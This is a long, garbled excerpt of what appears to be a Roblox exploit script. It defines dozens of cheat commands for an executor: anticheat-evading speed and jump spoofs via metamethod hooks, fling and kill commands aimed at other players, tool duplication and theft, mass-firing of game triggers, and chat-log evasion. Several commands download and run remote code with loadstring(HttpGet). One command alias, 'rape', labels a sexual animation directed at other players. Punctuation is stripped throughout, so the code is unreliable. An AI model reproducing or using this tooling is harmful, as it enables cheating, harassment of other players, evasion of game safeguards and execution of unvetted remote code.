	HumanModCons.ejLoop = (HumanModCons.ejLoop and HumanModCons.ejLoopDisconnect() and false) or nil
	HumanModCons.ejCA = (HumanModCons.ejCA and HumanModCons.ejCADisconnect() and false) or nil
end)
...
addcmd(team, {}, function(args, speaker)
    ...
    for _, v in ipairs(TeamsGetChildren()) do
        if v.Namelower()match(teamNamelower()) then
            team = v
            break
        end
    end
    ...
    if root and firetouchinterest then
        for _, v in ipairs(workspaceGetDescendants()) do
            if vIsA(SpawnLocation) and v.BrickColor == team.TeamColor and v.AllowTeamChangeOnTouch == true then
...
addcmd('nobgui',{'unbgui','nobillboardgui','unbillboardgui','noname','rohg'},function(args, speaker)
	for i,v in pairs(speaker.CharacterGetDescendants())do
		if vIsA(BillboardGui) or vIsA(SurfaceGui) then
			vDestroy()
		end
	end
end)
...
addcmd('loopnobgui',{'loopunbgui','loopnobillboardgui','loopunbillboardgui','loopnoname','looprohg'},function(args, speaker)
	...
	local function charPartAdded(part)
		if partIsA(BillboardGui) or partIsA(SurfaceGui) then
			wait()
			partDestroy()
		end
	end
	charPartTrigger = speaker.Character.DescendantAddedConnect(charPartAdded)
end)
...
addcmd('spasm',{},function(args, speaker)
	if not r15(speaker) then
		...
		Spasm = pcharFindFirstChildOfClass('Humanoid')LoadAnimation(SpasmAnim)
		SpasmPlay()
		SpasmAdjustSpeed(99)
	else
...
addcmd('headthrow',{},function(args, speaker)
	if not r15(speaker) then
		...
		local k = speaker.CharacterFindFirstChildOfClass('Humanoid')LoadAnimation(Anim)
		kPlay(0)
		kAdjustSpeed(1)
	else
		notify('R6 Required','This command requires the r6 rig type')
...
addcmd('animation',{'anim'},function(args, speaker)
	if not r15(speaker) then
		...
		local Anim = Instance.new(Animation)
		Anim.AnimationId = rbxassetid..AnimationId
		local k = pcharFindFirstChildOfClass('Humanoid')LoadAnimation(Anim)
		kPlay()
		if args[2] then
			kAdjustSpeed(tostring(args[2]))
		end
	else
		notify('R6 Required','This command requires the r6 rig type')
	end
...
addcmd('animspeed',{},function(args, speaker)
	local Char = speaker.Character
	local Hum = CharFindFirstChildOfClass(Humanoid) or CharFindFirstChildOfClass(AnimationController)

	for i,v in next, HumGetPlayingAnimationTracks() do
		vAdjustSpeed(tonumber(args[1] or 1))
	end
end)
...
addcmd('copyanimation',{'copyanim','copyemote'},function(args, speaker)
	...
	for _,v in ipairs(players)do
		...
		for _, v1 in pairs(speaker.CharacterFindFirstChildOfClass('Humanoid')GetPlayingAnimationTracks()) do
			v1Stop()
		end
		for _, v1 in pairs(Players[v].CharacterFindFirstChildOfClass('Humanoid')GetPlayingAnimationTracks()) do
			if not string.find(v1.Animation.AnimationId, 507768375) then
				local ANIM = speaker.CharacterFindFirstChildOfClass('Humanoid')LoadAnimation(v1.Animation)
				ANIMPlay(.1, 1, v1.Speed)
...
addcmd(copyanimationid, {copyanimid, copyemoteid}, function(args, speaker)
    local copyAnimId = function(player)
        ...
        for _, v in pairs(player.CharacterFindFirstChildWhichIsA(Humanoid)GetPlayingAnimationTracks()) do
            local animationId = v.Animation.AnimationId
            local assetId = animationIdfind(rbxassetid) and animationIdmatch(%d+)

            if not string.find(animationId, 507768375) and not string.find(animationId, 180435571) then
                if assetId then
                    local success, result = pcall(function()
                        return MarketplaceServiceGetProductInfo(tonumber(assetId)).Name
                    end)
                    local name = success and result or Failed to get name
                    found = found .. nnName  .. name .. nAnimation Id  .. animationId
                else
                    found = found .. nnAnimation Id  .. animationId
                end
            end
        end
...
addcmd('refreshanimations', {'refreshanimation', 'refreshanims', 'refreshanim'}, function(args, speaker)
	local Char = speaker.Character or speaker.CharacterAddedWait()
	local Human = Char and CharWaitForChild('Humanoid', 15)
	local Animate = Char and CharWaitForChild('Animate', 15)
	if not Human or not Animate then
		return notify('Refresh Animations', 'Failed to get AnimateHumanoid')
	end
	Animate.Disabled = true
	for _, v in ipairs(HumanGetPlayingAnimationTracks()) do
		vStop()
	end
...
addcmd('tweentpposition',{'ttppos'},function(args, speaker)
	...
	local char = speaker.Character
	if char and getRoot(char) then
		TweenServiceCreate(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = CFrame.new(tpX,tpY,tpZ)})Play()
	end
end)
...
addcmd('offset',{},function(args, speaker)
	...
	if speaker.Character then
		speaker.CharacterTranslateBy(Vector3.new(tonumber(args[1]) or 0, tonumber(args[2]) or 0, tonumber(args[3]) or 0))
	end
end)
...
addcmd('clickteleport',{},function(args, speaker)
	if speaker == Players.LocalPlayer then
		notify('Click TP','Go to SettingsKeybindsAdd to set up click tp')
	end
end)
...
addcmd(mouseteleport, {mousetp}, function(args, speaker)
    ...
    if root and pos then
        root.CFrame = CFrame.new(pos.X, pos.Y + 3, pos.Z, select(4, root.CFramecomponents()))
    end
end)
...
addcmd('tptool', {'teleporttool'}, function(args, speaker)
	...
	TpTool.ActivatedConnect(function()
		local Char = speaker.Character or workspaceFindFirstChild(speaker.Name)
		local HRP = Char and CharFindFirstChild(HumanoidRootPart)
		if not Char or not HRP then
			return warn(Failed to find HumanoidRootPart)
		end
		HRP.CFrame = CFrame.new(IYMouse.Hit.X, IYMouse.Hit.Y + 3, IYMouse.Hit.Z, select(4, HRP.CFramecomponents()))
	end)
end)

addcmd('clickdelete',{},function(args, speaker)
	if speaker == Players.LocalPlayer then
		notify('Click Delete','Go to SettingsKeybindsAdd to set up click delete')
	end
end)
...
addcmd('getposition',{'getpos','notifypos','notifyposition'},function(args, speaker)
	...
	for i,v in pairs(players)do
		local char = Players[v].Character
		local pos = char and (getRoot(char) or charFindFirstChildWhichIsA(BasePart))
...
addcmd('walktopos',{'walktoposition'},function(args, speaker)
	...
	speaker.CharacterFindFirstChildOfClass('Humanoid').WalkToPoint = Vector3.new(args[1],args[2],args[3])
end)
...
addcmd('speed',{'ws','walkspeed'},function(args, speaker)
	if args[2] then
		...
		if isNumber(speed) then
			speaker.CharacterFindFirstChildOfClass('Humanoid').WalkSpeed = speed
		end
	else
	...
	if args[1] and isNumber(args[1]) then
		if hookmetamethod then
			...
			local index; index = hookmetamethod(game, __index, function(self, key)
				local keyclean = keygsub(0, )
				if (keyclean == WalkSpeed or keyclean == walkSpeed) and selfIsA(Humanoid) and selfIsDescendantOf(char) and not checkcaller() then
...
addcmd('loopspeed',{'loopws'},function(args, speaker)
	...
	if isNumber(speed) then
		...
		WalkSpeedChange()
		HumanModCons.wsLoop = (HumanModCons.wsLoop and HumanModCons.wsLoopDisconnect() and false) or HumanGetPropertyChangedSignal(WalkSpeed)Connect(WalkSpeedChange)
		HumanModCons.wsCA = (HumanModCons.wsCA and HumanModCons.wsCADisconnect() and false) or speaker.CharacterAddedConnect(function(nChar)
			Char, Human = nChar, nCharWaitForChild(Humanoid)
			WalkSpeedChange()
			HumanModCons.wsLoop = (HumanModCons.wsLoop and HumanModCons.wsLoopDisconnect() and false) or HumanGetPropertyChangedSignal(WalkSpeed)Connect(WalkSpeedChange)
		end)
...
addcmd('unloopspeed',{'unloopws'},function(args, speaker)
	HumanModCons.wsLoop = (HumanModCons.wsLoop and HumanModCons.wsLoopDisconnect() and false) or nil
	HumanModCons.wsCA = (HumanModCons.wsCA and HumanModCons.wsCADisconnect() and false) or nil
end)
...
addcmd('spoofjumppower',{'spoofjp'},function(args, speaker)
	if args[1] and isNumber(args[1]) then
		if hookmetamethod then
			...
			local index; index = hookmetamethod(game, __index, function(self, key)
				local keyclean = keygsub(0, )
				if (keyclean == JumpPower or keyclean == jumpPower) and selfIsA(Humanoid) and selfIsDescendantOf(char) and not checkcaller() then
...
addcmd('loopjumppower',{'loopjp','loopjpower'},function(args, speaker)
	...
	if isNumber(jpower) then
		...
		JumpPowerChange()
		HumanModCons.jpLoop = (HumanModCons.jpLoop and HumanModCons.jpLoopDisconnect() and false) or HumanGetPropertyChangedSignal(JumpPower)Connect(JumpPowerChange)
		HumanModCons.jpCA = (HumanModCons.jpCA and HumanModCons.jpCADisconnect() and false) or speaker.CharacterAddedConnect(function(nChar)
			Char, Human = nChar, nCharWaitForChild(Humanoid)
			JumpPowerChange()
			HumanModCons.jpLoop = (HumanModCons.jpLoop and HumanModCons.jpLoopDisconnect() and false) or HumanGetPropertyChangedSignal(JumpPower)Connect(JumpPowerChange)
		end)
...
addcmd('unloopjumppower',{'unloopjp','unloopjpower'},function(args, speaker)
	local Char = speaker.Character or workspaceFindFirstChild(speaker.Name)
	local Human = Char and CharFindFirstChildWhichIsA(Humanoid)
	HumanModCons.jpLoop = (HumanModCons.jpLoop and HumanModCons.jpLoopDisconnect() and false) or nil
	HumanModCons.jpCA = (HumanModCons.jpCA and HumanModCons.jpCADisconnect() and false) or nil
	if Char and Human then
		if speaker.CharacterFindFirstChildOfClass('Humanoid').UseJumpPower then
			speaker.CharacterFindFirstChildOfClass('Humanoid').JumpPower = 50
		else
			speaker.CharacterFindFirstChildOfClass('Humanoid').JumpHeight  = 50
		end
	end
end)
...
addcmd('tools',{'gears'},function(args, speaker)
	local function copy(instance)
		for i,c in pairs(instanceGetChildren())do
			if cIsA('Tool') or cIsA('HopperBin') then
				cClone().Parent = speakerFindFirstChildOfClass(Backpack)
			end
			copy(c)
		end
	end
...
addcmd('notools',{'rtools','clrtools','removetools','deletetools','dtools'},function(args, speaker)
	for i,v in pairs(speakerFindFirstChildOfClass(Backpack)GetDescendants()) do
		if vIsA('Tool') or vIsA('HopperBin') then
			vDestroy()
		end
	end
	for i,v in pairs(speaker.CharacterGetDescendants()) do
...
addcmd(console, {}, function(args, speaker)
    StarterGuiSetCore(DevConsoleVisible, true)
end)
...
addcmd('oldconsole',{},function(args, speaker)
	...
	local _, str = pcall(function()
		return gameHttpGet(httpsraw.githubusercontent.cominfyiffbackupmainconsole.lua, true)
	end)
...
addcmd('explorer', {'dex'}, function(args, speaker)
	notify('Loading', 'Hold on a sec')
	loadstring(gameHttpGet(httpsraw.githubusercontent.cominfyiffbackupmaindex.lua))()
end)
...
addcmd('olddex', {'odex'}, function(args, speaker)
	...
	local getobjects = function(a)
		local Objects = {}
		if a then
			local b = InsertServiceLoadLocalAsset(a)
			if b then 
	...
	local Dex = getobjects(rbxassetid10055842438)[1]
	Dex.Parent = PARENT
	...
	local function Load(Obj, Url)
		...
		local function LoadScripts(_, Script)
			if ScriptIsA(LocalScript) then
				task.spawn(function()
					GiveOwnGlobals(loadstring(Script.Source,=..ScriptGetFullName()), Script)()
				end)
			end
			table.foreach(ScriptGetChildren(), LoadScripts)
		end
...
addcmd('remotespy',{'rspy'},function(args, speaker)
	...
	loadstring(gameHttpGet(httpsraw.githubusercontent.cominfyiffbackupmainSimpleSpyV3main.lua))()
end)

addcmd('audiologger',{'alogger'},function(args, speaker)
	notify(Loading,'Hold on a sec')
	loadstring(gameHttpGet(('httpsraw.githubusercontent.cominfyiffbackupmainaudiologger.lua'),true))()
end)
...
addcmd('headsit',{},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	if headSit then headSitDisconnect() end
	for i,v in pairs(players)do
		speaker.CharacterFindFirstChildOfClass('Humanoid').Sit = true
		headSit = RunService.HeartbeatConnect(function()
			if PlayersFindFirstChild(Players[v].Name) and Players[v].Character ~= nil and getRoot(Players[v].Character) and getRoot(speaker.Character) and speaker.CharacterFindFirstChildOfClass('Humanoid').Sit == true then
...
addcmd('blockhead',{},function(args, speaker)
	speaker.Character.HeadFindFirstChildOfClass(SpecialMesh)Destroy()
end)

addcmd('blockhats',{},function(args, speaker)
	for _,v in pairs(speaker.CharacterFindFirstChildOfClass('Humanoid')GetAccessories()) do
		for i,c in pairs(vGetDescendants()) do
			if cIsA(SpecialMesh) then
				cDestroy()
			end
		end
	end
...
addcmd('blocktool',{},function(args, speaker)
	for _,v in pairs(speaker.CharacterGetChildren()) do
		if vIsA(Tool) or vIsA(HopperBin) then
			for i,c in pairs(vGetDescendants()) do
				if cIsA(SpecialMesh) then
					cDestroy()
...
addcmd('creeper',{},function(args, speaker)
	if r15(speaker) then
		speaker.Character.HeadFindFirstChildOfClass(SpecialMesh)Destroy()
		speaker.Character.LeftUpperArmDestroy()
		speaker.Character.RightUpperArmDestroy()
		speaker.CharacterFindFirstChildOfClass(Humanoid)RemoveAccessories()
	else
		speaker.Character.HeadFindFirstChildOfClass(SpecialMesh)Destroy()
...
function getTorso(x)
	...
	return xFindFirstChild(Torso) or xFindFirstChild(UpperTorso) or xFindFirstChild(LowerTorso) or xFindFirstChild(HumanoidRootPart)
end
...
addcmd(bang, {rape}, function(args, speaker)
	...
	bangAnim.AnimationId = not r15(speaker) and rbxassetid148840371 or rbxassetid5918726674
	bang = humanoidLoadAnimation(bangAnim)
	bangPlay(0.1, 1, 1)
	bangAdjustSpeed(args[2] or 3)
	bangDied = humanoid.DiedConnect(function()
		bangStop()
		bangAnimDestroy()
		bangDiedDisconnect()
		bangLoopDisconnect()
	...
	if args[1] then
		...
		for _, v in pairs(players) do
			...
			bangLoop = RunService.SteppedConnect(function()
				pcall(function()
...
addcmd('carpet',{},function(args, speaker)
	if not r15(speaker) then
		...
		for i,v in pairs(players)do
			...
			carpetAnim.AnimationId = rbxassetid282574440
			carpet = speaker.CharacterFindFirstChildOfClass('Humanoid')LoadAnimation(carpetAnim)
			carpetPlay(.1, 1, 1)
			local carpetplr = Players[v].Name
			carpetDied = speaker.CharacterFindFirstChildOfClass'Humanoid'.DiedConnect(function()
				carpetLoopDisconnect()
				carpetStop()
				carpetAnimDestroy()
				carpetDiedDisconnect()
			end)
			carpetLoop = RunService.HeartbeatConnect(function()
				pcall(function()
...
addcmd('friend',{},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		speakerRequestFriendship(Players[v])
	end
end)
...
addcmd('unfriend',{},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		speakerRevokeFriendship(Players[v])
	end
end)
...
addcmd('bringpartclass',{'bpc'},function(args, speaker)
	for i,v in pairs(workspaceGetDescendants()) do
		if v.ClassNamelower() == getstring(1)lower() and vIsA(BasePart) then
			v.CFrame = getRoot(speaker.Character).CFrame
		end
	end
end)
...
addcmd('tweengotopart',{'tgotopart','ttopart'},function(args, speaker)
	for i,v in pairs(workspaceGetDescendants()) do
		if v.Namelower() == getstring(1)lower() and vIsA(BasePart) then
			...
			wait(gotopartDelay)
			TweenServiceCreate(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = v.CFrame})Play()
		end
	end
end)
...
addcmd('gotomodel',{'tomodel'},function(args, speaker)
	for i,v in pairs(workspaceGetDescendants()) do
		if v.Namelower() == getstring(1)lower() and vIsA(Model) then
			if speaker.CharacterFindFirstChildOfClass('Humanoid') and speaker.CharacterFindFirstChildOfClass('Humanoid').SeatPart then
				speaker.CharacterFindFirstChildOfClass('Humanoid').Sit = false
				wait(.1)
			end
			wait(gotopartDelay)
			getRoot(speaker.Character).CFrame = vGetModelCFrame()
		end
	end
end)
...
addcmd('tweengotomodel',{'tgotomodel','ttomodel'},function(args, speaker)
	for i,v in pairs(workspaceGetDescendants()) do
		if v.Namelower() == getstring(1)lower() and vIsA(Model) then
			...
			wait(gotopartDelay)
			TweenServiceCreate(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = vGetModelCFrame()})Play()
		end
	end
end)
...
addcmd('noclickdetectorlimits',{'nocdlimits','removecdlimits'},function(args, speaker)
	for i,v in ipairs(workspaceGetDescendants()) do
		if vIsA(ClickDetector) then
...
addcmd('fireclickdetectors',{'firecd','firecds'}, function(args, speaker)
	if fireclickdetector then
		if args[1] then
			...
			for _, descendant in ipairs(workspaceGetDescendants()) do
				if descendantIsA(ClickDetector) and descendant.Name == name or descendant.Parent.Name == name then
					fireclickdetector(descendant)
				end
			end
		else
			for _, descendant in ipairs(workspaceGetDescendants()) do
				if descendantIsA(ClickDetector) then
					fireclickdetector(descendant)
				end
			end
		end
...
addcmd('fireproximityprompts',{'firepp'},function(args, speaker)
	if fireproximityprompt then
		if args[1] then
			local name = getstring(1)
			for _, descendant in ipairs(workspaceGetDescendants()) do
				if descendantIsA(ProximityPrompt) and descendant.Name == name or descendant.Parent.Name == name then
					fireproximityprompt(descendant)
				end
			end
		else
			for _, descendant in ipairs(workspaceGetDescendants()) do
				if descendantIsA(ProximityPrompt) then
					fireproximityprompt(descendant)
				end
			end
		end
...
addcmd('instantproximityprompts',{'instantpp'},function(args, speaker)
	if fireproximityprompt then
		...
		wait(0.1)
		PromptButtonHoldBegan = ProximityPromptService.PromptButtonHoldBeganConnect(function(prompt)
...
addcmd('uninstantproximityprompts',{'uninstantpp'},function(args, speaker)
	if PromptButtonHoldBegan ~= nil then
		PromptButtonHoldBeganDisconnect()
		PromptButtonHoldBegan = nil
	end
end)

addcmd('notifyping',{'ping'},function(args, speaker)
	notify(Ping, math.round(speakerGetNetworkPing()  1000) .. ms)
end)

addcmd('grabtools', {}, function(args, speaker)
	local humanoid = speaker.CharacterFindFirstChildWhichIsA(Humanoid)
	for _, child in ipairs(workspaceGetChildren()) do
		if speaker.Character and childIsA(BackpackItem) and childFindFirstChild(Handle) then
			humanoidEquipTool(child)
		end
	end

	if grabtoolsFunc then 
		grabtoolsFuncDisconnect() 
	end

	grabtoolsFunc = workspace.ChildAddedConnect(function(child)
		if speaker.Character and childIsA(BackpackItem) and childFindFirstChild(Handle) then
			humanoidEquipTool(child)
		end
	end)
...
addcmd('removespecifictool',{},function(args, speaker)
	if args[1] and speakerFindFirstChildOfClass(Backpack) then
		local tool = string.lower(getstring(1))
		local RST = RunService.RenderSteppedConnect(function()
			if speakerFindFirstChildOfClass(Backpack) then
				for i,v in pairs(speakerFindFirstChildOfClass(Backpack)GetChildren()) do
					if v.Namelower() == tool then
						vRemove()
					end
				end
			end
	...
	for i,v in pairs(players)do
		task.spawn(function()
			for i,v in pairs(Players[v]FindFirstChildOfClass(Backpack)GetChildren()) do
				if vIsA('Tool') or vIsA('HopperBin') then
					vClone().Parent = speakerFindFirstChildOfClass(Backpack)
				end
			end
		end)
	end
...
addcmd('noface',{'removeface'},function(args, speaker)
	for i,v in pairs(speaker.CharacterGetDescendants()) do
		if vIsA(Decal) and v.Name == 'face' then
			vDestroy()
		end
	end
end)
...
addcmd('hatspin',{'spinhats'},function(args, speaker)
	...
	for _,v in pairs(speaker.CharacterFindFirstChildOfClass('Humanoid')GetAccessories()) do
		...
		v.HandleFindFirstChildOfClass(Weld)Destroy()
		if args[1] then
		...
		keep.P = 30000
		keep.D = 50
		spinhats = RunService.SteppedConnect(function()
			pcall(function()
...
addcmd('unhatspin',{'unspinhats'},function(args, speaker)
	...
	for _,v in pairs(speaker.CharacterFindFirstChildOfClass('Humanoid')GetAccessories()) do
		...
		for i,c in pairs(v.Handle) do
			if cIsA(BodyPosition) or cIsA(BodyAngularVelocity) then
				cDestroy()
			end
		end
		wait()
...
addcmd('clearhats',{'cleanhats'},function(args, speaker)
	if firetouchinterest then
		...
		local Character = Player.Character
		local Old = CharacterFindFirstChild(HumanoidRootPart).CFrame
		local Hats = {}

		for _, child in ipairs(workspaceGetChildren()) do
			if childIsA(Accessory) then
				table.insert(Hats, child)
			end
		end

		for _, accessory in ipairs(CharacterFindFirstChildOfClass(Humanoid)GetAccessories()) do
			accessoryDestroy()
		end

		for i = 1, #Hats do
			repeat RunService.Heartbeatwait() until Hats[i]
			firetouchinterest(Hats[i].Handle,CharacterFindFirstChild(HumanoidRootPart),0)
			repeat RunService.Heartbeatwait() until CharacterFindFirstChildOfClass(Accessory)
			CharacterFindFirstChildOfClass(Accessory)Destroy()
			repeat RunService.Heartbeatwait() until not CharacterFindFirstChildOfClass(Accessory)
		end

		execCmd(reset)

		Player.CharacterAddedWait()

		for i = 1,20 do 
			RunService.HeartbeatWait()
			if Player.CharacterFindFirstChild(HumanoidRootPart) then
				Player.CharacterFindFirstChild(HumanoidRootPart).CFrame = Old
			end
		end
	else
...
addcmd('split',{},function(args, speaker)
	if r15(speaker) then
		speaker.Character.UpperTorso.WaistDestroy()
	else
...
addcmd('replaceroot',{'replacerootpart'},function(args, speaker)
	if speaker.Character ~= nil and speaker.CharacterFindFirstChild(HumanoidRootPart) then
		local Char = speaker.Character
...
addcmd('clearcharappearance',{'clearchar','clrchar'},function(args, speaker)
	speakerClearCharacterAppearance()
end)
...
addcmd('unequiptools',{},function(args, speaker)
	speaker.CharacterFindFirstChildOfClass('Humanoid')UnequipTools()
end)

local function GetHandleTools(p)
	p = p or Players.LocalPlayer
	local r = {}
	for _, v in ipairs(p.Character and p.CharacterGetChildren() or {}) do
		if v.IsA(v, BackpackItem) and v.FindFirstChild(v, Handle) then
			r[#r + 1] = v
		end
	end
	for _, v in ipairs(p.BackpackGetChildren()) do
		if v.IsA(v, BackpackItem) and v.FindFirstChild(v, Handle) then
			r[#r + 1] = v
		end
	end
...
addcmd('dupetools', {'clonetools'}, function(args, speaker)
	...
	for i = 1, LOOP_NUM do
		local Human = speaker.CharacterWaitForChild(Humanoid)
		wait(.1, Human.ParentMoveTo(TempPos))
		Human.RootPart.Anchored = speakerClearCharacterAppearance(wait(.1)) or true
		...
		wait(.1)
		speaker.Character = speaker.CharacterDestroy()
		speaker.CharacterAddedWait()WaitForChild(Humanoid).ParentMoveTo(LOOP_NUM == i and OrigPos or TempPos, wait(.1))
...
addcmd('givetool', {'givetools'}, function(args, speaker)
	...
	workspace.CurrentCamera.CameraSubject = v
	local Char = speaker.Character or workspaceFindFirstChild(speaker.Name)
	local hum = Char and CharFindFirstChildWhichIsA('Humanoid')
	local hrp = hum and hum.RootPart
	local hrppos = hrp.CFrame
	hum = humDestroy() or humClone()
	hum.Parent = Char
	humClearAllChildren()
	speakerClearCharacterAppearance()
	task.spawn(function()
		speaker.CharacterAddedWait()WaitForChild('Humanoid').RootPart.CFrame = wait() and hrppos
	end)
	local vHRP = getRoot(v)
	while Char and Char.Parent and vHRP and vHRP.Parent do
		local Tools = false
		for _, v in ipairs(CharGetChildren()) do
			if vIsA('BackpackItem') and vFindFirstChild('Handle') then
				Tools = true
...
addcmd('touchinterests', {'touchinterest', 'firetouchinterests', 'firetouchinterest'}, function(args, speaker)
	...
	local root = getRoot(speaker.Character) or speaker.CharacterFindFirstChildWhichIsA(BasePart)

	local function touch(x)
		x = xFindFirstAncestorWhichIsA(Part)
		if x then
			if firetouchinterest then
				task.spawn(function()
	...
	if args[1] then
		local name = getstring(1)
		for _, descendant in ipairs(workspaceGetDescendants()) do
			if descendantIsA(TouchTransmitter) and descendant.Name == name or descendant.Parent.Name == name then
				touch(descendant)
			end
		end
	else
		for _, descendant in ipairs(workspaceGetDescendants()) do
			if descendantIsA(TouchTransmitter) then
				touch(descendant)
			end
		end
	end
...
addcmd('loopfullbright',{'loopfb'},function(args, speaker)
	...
	brightLoop = RunService.RenderSteppedConnect(brightFunc)
end)
...
addcmd('norotate',{'noautorotate'},function(args, speaker)
	speaker.CharacterFindFirstChildOfClass('Humanoid').AutoRotate  = false
end)

addcmd('unnorotate',{'autorotate'},function(args, speaker)
	speaker.CharacterFindFirstChildOfClass('Humanoid').AutoRotate  = true
end)
...
addcmd('enablestate',{},function(args, speaker)
	...
	speaker.CharacterFindFirstChildOfClass(Humanoid)SetStateEnabled(x, true)
end)
...
addcmd('disablestate',{},function(args, speaker)
	...
	speaker.CharacterFindFirstChildOfClass(Humanoid)SetStateEnabled(x, false)
end)
...
addcmd('deletehats',{'nohats','rhats'},function(args, speaker)
	for i,v in next, speaker.CharacterGetDescendants() do
		if vIsA(Accessory) then
			for i,p in next, vGetDescendants() do
				if pIsA(Weld) then
					pDestroy()
				end
			end
...
addcmd('droptools',{'droptool'},function(args, speaker)
	for i,v in pairs(Players.LocalPlayer.BackpackGetChildren()) do
		if vIsA(Tool) then
			v.Parent = Players.LocalPlayer.Character
		end
	end
	wait()
	for i,v in pairs(Players.LocalPlayer.CharacterGetChildren()) do
		if vIsA(Tool) then
			v.Parent = workspace
		end
	end
...
addcmd('droppabletools',{},function(args, speaker)
	if speaker.Character then
		for _,obj in pairs(speaker.CharacterGetChildren()) do
			if objIsA(Tool) then
	...
	if speakerFindFirstChildOfClass(Backpack) then
		for _,obj in pairs(speakerFindFirstChildOfClass(Backpack)GetChildren()) do
			if objIsA(Tool) then
				obj.CanBeDropped = true
			end
		end
...
addcmd('unreach',{'noreach','unboxreach'},function(args, speaker)
	for i,v in pairs(speaker.CharacterGetDescendants()) do
		if vIsA(Tool) then
			...
			v.Handle.SelectionBoxCreatedDestroy()
		end
	end
end)
...
addcmd('grippos',{},function(args, speaker)
	for i,v in pairs(speaker.CharacterGetDescendants()) do
		if vIsA(Tool) then
			v.Parent = speakerFindFirstChildOfClass(Backpack)
...
addcmd('usetools', {}, function(args, speaker)
	local Backpack = speakerFindFirstChildOfClass(Backpack)
	local ammount = tonumber(args[1]) or 1
	local delay_ = tonumber(args[2]) or false
	for _, v in ipairs(BackpackGetChildren()) do
		v.Parent = speaker.Character
		task.spawn(function()
			for _ = 1, ammount do
				vActivate()
...
addcmd(antichatlogs, {antichatlogger}, function(args, speaker)
    ...
    local MessagePosted, _ = pcall(function()
        rawset(require(speakerFindFirstChild(PlayerScripts)FindFirstChild(ChatScript).ChatMain), MessagePosted, {
            [fire] = function(msg)
                return msg
            end,
            [wait] = function()
...
addcmd('fling',{},function(args, speaker)
	...
	bambam.P = math.huge
	local Char = speaker.CharacterGetChildren()
	...
	flingDied = speaker.CharacterFindFirstChildOfClass('Humanoid').DiedConnect(flingDiedF)
	repeat
		bambam.AngularVelocity = Vector3.new(0,99999,0)
		wait(.2)
...
addcmd('unfling',{'nofling'},function(args, speaker)
	...
	for _, child in pairs(speakerCharGetDescendants()) do
...
addcmd(flyfling, {}, function(args, speaker)
    execCmd(unvehicleflyunwalkfling)
    wait()
    if args[1] and isNumber(args[1]) then
        vehicleflyspeed = args[1]
    end
    execCmd(vehicleflywalkfling)
end)

addcmd(unflyfling, {}, function(args, speaker)
    execCmd(unvehicleflyunwalkflingbreakvelocity)
end)
...
addcmd(walkfling, {}, function(args, speaker)
    ...
    walkflinging = true
    repeat RunService.HeartbeatWait()
...
addcmd('invisfling',{},function(args, speaker)
	...
	invisflingStepped = RunService.SteppedConnect(function()
		if speaker.Character and getRoot(speaker.Character) then
			getRoot(speaker.Character).CanCollide = false
		else
			invisflingSteppedDisconnect()
		end
	end)
	sFLY()
	...
	bambam.Parent = getRoot(speaker.Character)
	bambam.Force = Vector3.new(99999,9999910,99999)
...
addcmd(antifling, {}, function(args, speaker)
    ...
    antifling = RunService.SteppedConnect(function()
        for _, player in pairs(PlayersGetPlayers()) do
            if player ~= speaker and player.Character then
                for _, v in pairs(player.CharacterGetDescendants()) do
                    if vIsA(BasePart) then
                        v.CanCollide = false
                    end
                end
...
function attach(speaker,target)
	if tools(speaker) then
		...
		local hum = speaker.CharacterFindFirstChildOfClass(Humanoid)
		local hrp = getRoot(speaker.Character)
		local hrp2 = getRoot(target.Character)
		hum.Name = 1
		local newHum = humClone()
		newHum.Parent = char
		...
		local tool = speakerFindFirstChildOfClass(Backpack)FindFirstChildOfClass(Tool) or speaker.CharacterFindFirstChildOfClass(Tool)
		tool.Parent = char
...
function kill(speaker,target,fast)
	if tools(speaker) then
		if target ~= nil then
			...
			speaker.CharacterAddedWait()WaitForChild(HumanoidRootPart).CFrame = NormPos
		end
	else
		notify('Tool Required','You need to have an item in your inventory to use this command')
	end
...
addcmd('handlekill', {'hkill'}, function(args, speaker)
	...
	for _, v in ipairs(getPlayer(args[1], speaker)) do
		...
		task.spawn(function()
			...
			notify(Handle Kill Stopped!, v.Name ..  diedleft or you unequipped the tool!)
		end)
	end
end)
...
addcmd('tpwalk', {'teleportwalk'}, function(args, speaker)
	...
	local hum = chr and chrFindFirstChildWhichIsA(Humanoid)
	while tpwalking and chr and hum and hum.Parent do
		local delta = hbWait()
		if hum.MoveDirection.Magnitude  0 then
			if args[1] and isNumber(args[1]) then
				chrTranslateBy(hum.MoveDirection  tonumber(args[1])  delta  10)
			else
				chrTranslateBy(hum.MoveDirection  delta  10)
			end
		end
	end
end)
...
xray = function()
    for _, v in pairs(workspaceGetDescendants()) do
        if vIsA(BasePart) and not v.ParentFindFirstChildWhichIsA(Humanoid) and not v.Parent.ParentFindFirstChildWhichIsA(Humanoid) then
...
addcmd(loopxray, {}, function(args, speaker)
    ...
    xrayLoop = RunService.RenderSteppedConnect(function()
        xrayEnabled = true
        xray()
    end)
end)
...
addcmd('walltp',{},function(args, speaker)
	...
	local function touchedFunc(hit)
		local Root = getRoot(speaker.Character)
		if hitIsA(BasePart) and hit.Position.Y  Root.Position.Y - speaker.CharacterFindFirstChildOfClass('Humanoid').HipHeight then
			local hitP = getRoot(hit.Parent)
			if hitP ~= nil then
				Root.CFrame = hit.CFrame  CFrame.new(Root.CFrame.lookVector.X,hitP.Size.Z2 + speaker.CharacterFindFirstChildOfClass('Humanoid').HipHeight,Root.CFrame.lookVector.Z)
			elseif hitP == nil then
				Root.CFrame = hit.CFrame  CFrame.new(Root.CFrame.lookVector.X,hit.Size.Y2 + speaker.CharacterFindFirstChildOfClass('Humanoid').HipHeight,Root.CFrame.lookVector.Z)
			end
		end
	end
	walltpTouch = torso.TouchedConnect(touchedFunc)
end)

addcmd('unwalltp',{'nowalltp'},function(args, speaker)
	if walltpTouch then
		walltpTouchDisconnect()
	end
end)
...
addcmd('autoclick',{},function(args, speaker)
	if mouse1press and mouse1release then
		...
		autoclicking = true
		cancelAutoClick = UserInputService.InputBeganConnect(function(input, gameProcessedEvent)
			if not gameProcessedEvent then
